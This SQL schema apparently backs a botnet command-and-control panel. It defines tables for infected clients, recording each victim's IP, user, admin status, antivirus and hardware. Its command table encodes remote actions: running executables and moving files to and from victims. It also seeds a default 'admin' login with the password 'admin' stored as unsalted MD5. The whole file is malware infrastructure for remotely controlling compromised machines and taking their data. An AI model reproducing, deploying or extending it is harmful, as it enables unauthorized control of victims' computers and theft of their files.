CREATE DATABASE IF NOT EXISTS  panel;
USE panel;
/* Accounts Passwords are MD5*/
CREATE TABLE IF NOT EXISTS accounts(
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
	username VARCHAR(120),
	password VARCHAR(120)
);

INSERT INTO accounts(username, password) VALUES ('admin','21232f297a57a5a743894a0e4a801fc3'); /* Username: admin Password: admin in MD5 */

/* Bot Information Table */
CREATE TABLE IF NOT EXISTS clients(
    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    guid VARCHAR(120),
    ip VARCHAR(120),
	whoami VARCHAR(120),
	os VARCHAR(120),
	installdate	VARCHAR(120),
	isadmin VARCHAR(120),
	antivirus VARCHAR(120),
	cpuinfo VARCHAR(120),
	gpuinfo VARCHAR(120),
	clientversion VARCHAR(120),
	lastcheckin VARCHAR(120),
	lastcommand VARCHAR(120)
);

/* TaskMngr */
CREATE TABLE IF NOT EXISTS tasks(
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
	name VARCHAR(120),
	guid VARCHAR(120),
	command TEXT(65533),
	method VARCHAR(120)
);

/* Commands */
CREATE TABLE IF NOT EXISTS command(
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
	code INT NOT NULL COMMENT "0 - run exe ; 1 - idle ; 2 - transfer s -> c ; 3 transfer c -> s",
	interval_sec INT DEFAULT 0 NULL COMMENT "command run each sec",
	run_count INT DEFAULT 1 COMMENT "run count",
	command TEXT(65533),
	status INT DEFAULT 0 COMMENT "0 - create ; 1 - doing ; 2 - done ; 3 - error ;", 
	guid VARCHAR(120) NOT NULL COMMENT " guid is foreign key of clients.guid",
	file_path VARCHAR(1200)  DEFAULT "" COMMENT " result file path",
	last_update DATETIME DEFAULT NOW()
);

/* LastC&C */
CREATE TABLE IF NOT EXISTS lastlogin(
	id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
	timeanddate VARCHAR(120)
);